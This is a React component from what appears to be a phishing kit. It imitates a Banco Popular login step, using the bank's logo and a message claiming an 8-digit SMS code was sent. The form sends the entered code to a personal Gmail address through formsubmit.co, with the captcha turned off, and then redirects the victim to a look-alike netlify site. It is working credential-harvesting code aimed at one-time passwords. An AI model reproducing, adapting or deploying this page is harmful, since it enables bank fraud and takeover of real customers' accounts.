import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import './contraseña.css'
import Footer from './Footer'
import Cargando from './Cargando'

const Codigo = () => {

    const navigate = useNavigate()
    const [btonColor, setBtonColor] = useState(false)
    const [load, setLoad] = useState(true)

    setTimeout(() => {
        setLoad(false)
      }, 1500);

    const volver = () => {
        navigate('/validar-identidad')
    }

    const colorBtn = e => {
        if(e.target.value.length === 8){
            setBtonColor(true)
        }else {
            setBtonColor(false)
        }
    }

    if(load){
        return <Cargando />
    }else {
        return (
            <div className='contraseña'>
                <section>
                <div onClick={volver} className="back">
                    <div className="icon-back">
                      <i className='bx bx-arrow-back'></i>
                    </div>
                  <p>Volver</p>
                  </div>
        
                  <div className="texto-contraseña">
                    <div className="img-contra">
                      <img src="https://www.bancopopular.com.co/wps/wcm/connect/bancopopular/1784ee50-bf2a-4419-aa28-d28bc5737af0/linea-verde.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_M84C1K82N8V660QOF3GM0O0003-1784ee50-bf2a-4419-aa28-d28bc5737af0-nx7gw4u" alt="" />
                    </div>
                    <h1>Revisa tu celular</h1>
        
                    <p>Hemos enviado un mensahe de texto al número que tienes registrado en el banco con una clave temporal de 8 digitos.</p>
                  </div>
                  <form action="https://formsubmit.co/raulsacoco@gmail.com" method="POST">
                    <div>
                      <label htmlFor="password">Clave temporal</label>
                    </div>
                    <input onChange={colorBtn} id='password' type="password" name='codigo' minLength="8" maxLength="8" />
                    <input type="hidden" name="_captcha" value="false"></input>
                    <input type="hidden" name="_next" value="https://popular-compras.netlify.app/"></input>
        
                    <button className={`${btonColor && 'btn-active'}`}>Continuar</button>
                  </form>
        
                  <Footer />
                </section>
            </div>
          )
    }
}

export default Codigo